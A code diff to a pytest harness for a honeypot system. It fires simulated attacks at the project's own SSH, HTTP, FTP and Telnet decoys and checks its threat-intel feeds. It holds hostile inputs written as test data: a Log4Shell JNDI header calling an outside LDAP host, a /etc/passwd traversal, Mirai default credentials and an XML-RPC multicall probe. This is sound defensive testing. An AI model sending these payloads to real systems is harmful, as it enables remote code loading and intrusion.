@@ -1,29 +1,30 @@
 """
 tests/test_harness.py
 ─────────────────────
-Automated Multi-Protocol Intrusion Simulator & Verification Suite.
-Exercises SSH (2222), HTTP (8080), FTP (2121), Telnet (2323),
-and verifies threat intelligence ingestion via REST & STIX 2.1 APIs (9090).
+Enterprise Multi-Protocol Intrusion Simulator & Verification Suite.
+Exercises SSH (VFS sandbox & keystrokes), HTTP (.env, Log4j, XML-RPC, Gzip bomb),
+FTP (RFC 959), Telnet (RFC 854 Mirai IoT), and verifies threat dossiers, Snort rules,
+STIX 2.1, and CEF syslog pipelines.
 """
 
 import asyncio
 import os
+from pathlib import Path
 import socket
 import sys
-from pathlib import Path
 
 # Ensure project root is in sys.path
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 if str(PROJECT_ROOT) not in sys.path:
     sys.path.insert(0, str(PROJECT_ROOT))
 
+import threading
 import time
-from typing import Dict, Any
+from typing import Any, Dict
 import paramiko
 import pytest
 import requests
 import uvicorn
-import threading
 
 from core.config import settings
 
@@ -58,8 +59,8 @@ def ensure_honeypot_running():
     yield
 
 
-def test_http_decoy() -> bool:
-    """Simulate web attack vectors: credential leak, admin brute-force, and scanner probe."""
+def test_http_decoy() -> None:
+    """Simulate web attack vectors: credential leak, admin brute-force, Log4Shell, and scanner probe."""
     print("\n[+] Testing HTTP Decoy on port", settings.HTTP_PORT)
     base_url = f"http://{TARGET_HOST}:{settings.HTTP_PORT}"
 
@@ -78,13 +79,25 @@ def test_http_decoy() -> bool:
     assert resp_login.status_code == 401, f"Expected 401 for bad auth, got {resp_login.status_code}"
     print("    [✓] /wp-login.php brute force credential interception verified")
 
-    # 3. Test Spring Actuator discovery
+    # 3. Test WordPress XML-RPC multicall trap
+    resp_xml = requests.post(f"{base_url}/xmlrpc.php", data="<methodCall><methodName>system.multicall</methodName></methodCall>", timeout=5)
+    assert resp_xml.status_code == 200
+    assert "faultCode" in resp_xml.text
+    print("    [✓] /xmlrpc.php WordPress multicall brute-force trap verified")
+
+    # 4. Test Spring Actuator discovery
     resp_actuator = requests.get(f"{base_url}/actuator/health", timeout=5)
     assert resp_actuator.status_code == 200, "Actuator health endpoint failed"
     assert resp_actuator.json().get("status") == "UP"
     print("    [✓] /actuator/health Spring Boot decoy verified")
 
-    # 4. Test Scanner detection / Gzip Defense trigger
+    # 5. Test Log4j JNDI injection detection
+    jndi_header = "${jndi:ldap://198.51.100.22:1389/Exploit}"
+    resp_log4j = requests.get(f"{base_url}/api/v1/query", headers={"X-Api-Version": jndi_header}, timeout=5)
+    assert resp_log4j.status_code == 502
+    print("    [✓] Log4j JNDI exploit header intercepted and flagged")
+
+    # 6. Test Scanner detection / Gzip Defense trigger
     resp_scan = requests.get(
         f"{base_url}/../../etc/passwd",
         headers={"User-Agent": "sqlmap/1.6.12#stable"},
@@ -129,7 +142,6 @@ def test_telnet_decoy() -> None:
 
     try:
         s.connect((TARGET_HOST, settings.TELNET_PORT))
-        # Read until login prompt arrives
         banner = ""
         for _ in range(5):
             chunk = s.recv(1024).decode("utf-8", "ignore")
@@ -141,11 +153,9 @@ def test_telnet_decoy() -> None:
         assert "login:" in banner.lower() or "ubuntu" in banner.lower(), f"Unexpected banner: {banner}"
         print("    [✓] Telnet login prompt verified")
 
-        # Send Mirai default username
         s.sendall(b"root\r\n")
         time.sleep(0.2)
 
-        # Receive password prompt
         prompt = ""
         for _ in range(5):
             chunk = s.recv(1024).decode("utf-8", "ignore")
@@ -156,11 +166,9 @@ def test_telnet_decoy() -> None:
 
         assert "password" in prompt.lower(), f"Expected Password prompt, got: {prompt}"
 
-        # Send Mirai default password
         s.sendall(b"xc3511\r\n")
         time.sleep(0.2)
 
-        # Receive rejection
         resp = ""
         for _ in range(5):
             chunk = s.recv(1024).decode("utf-8", "ignore")
@@ -176,7 +184,7 @@ def test_telnet_decoy() -> None:
 
 
 def test_ssh_decoy() -> None:
-    """Connect to SSH decoy on port 2222, execute Linux reconnaissance commands, and exit."""
+    """Connect to SSH decoy on port 2222, test Virtual File System (VFS) persistence, and exit."""
     print("\n[+] Testing SSH Decoy on port", settings.SSH_PORT)
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -195,31 +203,34 @@ def test_ssh_decoy() -> None:
 
         channel = client.invoke_shell()
         time.sleep(0.5)
-        # Read welcome banner
         banner = channel.recv(2048).decode("utf-8", "ignore")
         assert "Ubuntu" in banner, f"Missing Ubuntu banner: {banner}"
         print("    [✓] Interactive shell prompt received")
 
-        # Send whoami
+        # Test whoami
         channel.send("whoami\r\n")
         time.sleep(0.4)
         out_whoami = channel.recv(1024).decode("utf-8", "ignore")
-        assert "root" in out_whoami, f"Unexpected whoami output: {out_whoami}"
-        print("    [✓] Executed 'whoami' -> received 'root'")
+        assert "root" in out_whoami
 
-        # Send uname -a
-        channel.send("uname -a\r\n")
-        time.sleep(0.4)
-        out_uname = channel.recv(1024).decode("utf-8", "ignore")
-        assert "Linux ubuntu-server-01" in out_uname, f"Unexpected uname output: {out_uname}"
-        print("    [✓] Executed 'uname -a' -> simulated Linux kernel info returned")
+        # Test VFS: echo payload > /tmp/trojan.sh
+        channel.send("echo 'exec evil' > /tmp/trojan.sh\r\n")
+        time.sleep(0.5)
+        channel.recv(1024)
 
-        # Send cat /etc/passwd
-        channel.send("cat /etc/passwd\r\n")
+        # Test VFS: cat /tmp/trojan.sh
+        channel.send("cat /tmp/trojan.sh\r\n")
+        time.sleep(0.5)
+        out_vfs = channel.recv(1024).decode("utf-8", "ignore")
+        assert "evil" in out_vfs, f"VFS state write failed: {out_vfs}"
+        print("    [✓] Virtual File System (VFS) stateful write/read validated (/tmp/trojan.sh)")
+
+        # Test VFS: cd /etc && pwd
+        channel.send("cd /etc\r\npwd\r\n")
         time.sleep(0.4)
-        out_passwd = channel.recv(2048).decode("utf-8", "ignore")
-        assert "www-data" in out_passwd, "Missing passwd content"
-        print("    [✓] Executed 'cat /etc/passwd' -> simulated account discovery output returned")
+        out_pwd = channel.recv(1024).decode("utf-8", "ignore")
+        assert "/etc" in out_pwd
+        print("    [✓] VFS directory traversal (cd /etc) validated")
 
         # Clean exit
         channel.send("exit\r\n")
@@ -233,65 +244,64 @@ def test_ssh_decoy() -> None:
 
 
 def test_api_and_feeds() -> None:
-    """Verify that all intrusions were classified and ingested into stats and threat feeds."""
+    """Verify that all intrusions were classified and ingested into dossiers and threat feeds."""
     print("\n[+] Testing Telemetry API and Threat Intelligence Feeds on port", settings.API_PORT)
     api_base = f"http://{TARGET_HOST}:{settings.API_PORT}"
 
-    # Wait briefly for database commits
     time.sleep(1.0)
 
     # 1. Check System Stats
     res_stats = requests.get(f"{api_base}/api/v1/stats", timeout=5)
     assert res_stats.status_code == 200, f"Stats failed: {res_stats.status_code}"
     stats = res_stats.json()
-    assert stats["total_attacks"] >= 4, f"Expected at least 4 attacks logged, got {stats['total_attacks']}"
-    assert "SSH" in stats["attacks_per_service"], "SSH attacks not reflected in per-service stats"
-    assert "HTTP" in stats["attacks_per_service"], "HTTP attacks not reflected in per-service stats"
-    assert "FTP" in stats["attacks_per_service"], "FTP attacks not reflected in per-service stats"
-    assert "TELNET" in stats["attacks_per_service"], "TELNET attacks not reflected in per-service stats"
-    print(f"    [✓] Aggregate statistics validated ({stats['total_attacks']} total intrusions recorded)")
+    assert stats["total_attacks"] >= 4
+    assert "avg_risk_score" in stats
+    assert "top_fingerprints" in stats
+    print(f"    [✓] Enterprise stats validated ({stats['total_attacks']} events, Avg Risk: {stats['avg_risk_score']})")
 
-    # 2. Check Recent Attacks Endpoint
-    res_recent = requests.get(f"{api_base}/api/v1/attacks/recent?limit=20", timeout=5)
-    assert res_recent.status_code == 200
-    attacks = res_recent.json()
-    assert len(attacks) > 0, "No attacks returned by /recent"
+    # 2. Check Threat Actor Dossier Endpoint
+    res_dossier = requests.get(f"{api_base}/api/v1/attacker/127.0.0.1", timeout=5)
+    assert res_dossier.status_code == 200
+    dossier = res_dossier.json()
+    assert "max_risk_score" in dossier
+    assert "primary_fingerprint" in dossier
+    print(f"    [✓] Threat Actor Dossier (/api/v1/attacker/127.0.0.1) confirmed: {dossier['primary_fingerprint']} (Risk: {dossier['max_risk_score']})")
 
-    # Verify MITRE classification mapping
-    mitre_ids = [a.get("mitre_technique_id") for a in attacks if a.get("mitre_technique_id")]
-    assert any(m in mitre_ids for m in ("T1110", "T1087", "T1082", "T1190")), f"MITRE classification missing: {mitre_ids}"
-    print(f"    [✓] MITRE ATT&CK technique classifications confirmed: {set(mitre_ids)}")
+    # 3. Check Automated Snort / Suricata NIDS Rule Signatures
+    res_snort = requests.get(f"{api_base}/api/v1/feed/snort.rules", timeout=5)
+    assert res_snort.status_code == 200
+    assert "alert ip" in res_snort.text or "# Honeypot-System" in res_snort.text
+    print("    [✓] Automated Snort/Suricata NIDS Rules (/api/v1/feed/snort.rules) active")
 
-    # 3. Check CIDR Plain-text Firewall Blocklist
+    # 4. Check OpenCTI / MISP Structured IOCs
+    res_iocs = requests.get(f"{api_base}/api/v1/feed/iocs.json", timeout=5)
+    assert res_iocs.status_code == 200
+    iocs_data = res_iocs.json()
+    assert "iocs" in iocs_data
+    print(f"    [✓] Machine-Readable IOC Feed (/api/v1/feed/iocs.json) active ({iocs_data['total_iocs']} indicators)")
+
+    # 5. Check ArcSight CEF Syslog Export
+    res_cef = requests.get(f"{api_base}/api/v1/feed/syslog.cef", timeout=5)
+    assert res_cef.status_code == 200
+    assert "CEF:0|Honeypot-System" in res_cef.text
+    print("    [✓] ArcSight CEF Syslog Feed (/api/v1/feed/syslog.cef) compliant")
+
+    # 6. Check Firewall CIDR Blocklist
     res_fw = requests.get(f"{api_base}/api/v1/feed/firewall.txt", timeout=5)
     assert res_fw.status_code == 200
-    assert "Honeypot-System v2.0" in res_fw.text
-    print("    [✓] Firewall CIDR Feed (/api/v1/feed/firewall.txt) active and formatted")
+    print("    [✓] Firewall CIDR Feed (/api/v1/feed/firewall.txt) active")
 
-    # 4. Check OASIS STIX 2.1 Threat Intel Bundle
+    # 7. Check OASIS STIX 2.1 Threat Intel Bundle
     res_stix = requests.get(f"{api_base}/api/v1/feed/stix.json", timeout=5)
     assert res_stix.status_code == 200
-    stix_data = res_stix.json()
-    assert stix_data.get("type") == "bundle"
-    assert "objects" in stix_data
+    assert res_stix.json().get("type") == "bundle"
     print("    [✓] STIX 2.1 Threat Intel Bundle (/api/v1/feed/stix.json) compliant")
-
-    # 5. Check Session Replay Endpoint
-    recordings = list(Path(settings.RECORDINGS_DIR).glob("*.json"))
-    if recordings:
-        sample_file = recordings[0].stem
-        session_id = sample_file.replace("ssh_", "")
-        res_replay = requests.get(f"{api_base}/api/v1/session/{session_id}/replay", timeout=5)
-        assert res_replay.status_code == 200
-        replay_data = res_replay.json()
-        assert "events" in replay_data
-        print(f"    [✓] Session Replay API (/api/v1/session/{session_id}/replay) verified ({len(replay_data['events'])} events)")
 
 
 def run_full_suite():
     """Run all test vectors sequentially and output results banner."""
     print("=" * 72)
-    print("  HONEYPOT-SYSTEM v2.0 - INTEGRATED ATTACK SIMULATION SUITE")
+    print("  HONEYPOT-SYSTEM v2.0 ENTERPRISE - ATTACK SIMULATION SUITE")
     print("=" * 72)
 
     passed = 0
@@ -302,7 +312,7 @@ def run_full_suite():
         ("FTP Decoy", test_ftp_decoy),
         ("Telnet Decoy", test_telnet_decoy),
         ("SSH Decoy", test_ssh_decoy),
-        ("API & Threat Intel Feeds", test_api_and_feeds),
+        ("API, Threat Dossiers & Feeds", test_api_and_feeds),
     ]
 
     for name, test_fn in tests:
@@ -321,7 +331,6 @@ def run_full_suite():
 
 
 if __name__ == "__main__":
-    # Check if honeypot server is already running, else start it in background thread
     server_running = False
     try:
         r = requests.get(f"http://{TARGET_HOST}:{settings.API_PORT}/api/v1/health", timeout=1.0)
@@ -330,9 +339,8 @@ if __name__ == "__main__":
     except Exception:
         server_running = False
 
-    server_thread = None
     if not server_running:
-        print("[*] Honeypot server not detected. Launching in background thread for testing...")
+        print("[*] Launching Honeypot server in background thread for testing...")
         from api.server import app
         
         config = uvicorn.Config(app, host=TARGET_HOST, port=settings.API_PORT, log_level="warning")
@@ -341,7 +349,6 @@ if __name__ == "__main__":
         server_thread = threading.Thread(target=server.run, daemon=True)
         server_thread.start()
         
-        # Wait for startup
         for _ in range(15):
             time.sleep(0.5)
             try:
